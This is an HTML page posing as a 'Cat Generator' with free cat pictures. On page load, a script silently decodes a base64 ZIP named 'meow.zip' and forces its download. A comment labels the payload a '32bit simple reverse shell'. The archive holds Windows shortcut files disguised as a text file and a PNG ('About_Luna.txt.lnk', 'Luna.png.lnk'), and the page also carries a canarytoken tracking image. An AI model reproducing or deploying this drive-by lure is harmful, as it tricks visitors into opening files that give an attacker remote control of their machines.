<html>
    <body>
    <h1>Cat Generator</h1>
        <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // 32bit simple reverse shell
            var file = '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';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'meow.zip'

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
  <main>
    <section>
      <h2>Free Cat Downloads</h2>
      <!-- TODO: Add link to cat photos -->
      <a href="<https://freecatphotoapp.com>"><img src="<https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg>" alt="A cute orange cat lying on its back."></a>
      <img src="<http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php>"/>
    </section>
    <section>
      <h2>Refresh For More Cats!</h2>
      <h3>Things Cats Love:</h3>
      <ul>
        <li>Cuddles</li>
        <li>Laser Pointers</li>
        <li>Yarn</li>
        <li>Kisses</li>  
      </ul>
      <img src="<https://static.vecteezy.com/system/resources/thumbnails/009/665/322/small/cute-kitty-cat-family-greeting-cartoon-element-png.png>" alt='soon'
    </section>
    <section>
    <!-- <img src="<https://clipart-library.com/new_gallery/398422_cute-cat-png.png>" alt='Meow.' -->
    </section>
  </main>
    </body>
</html>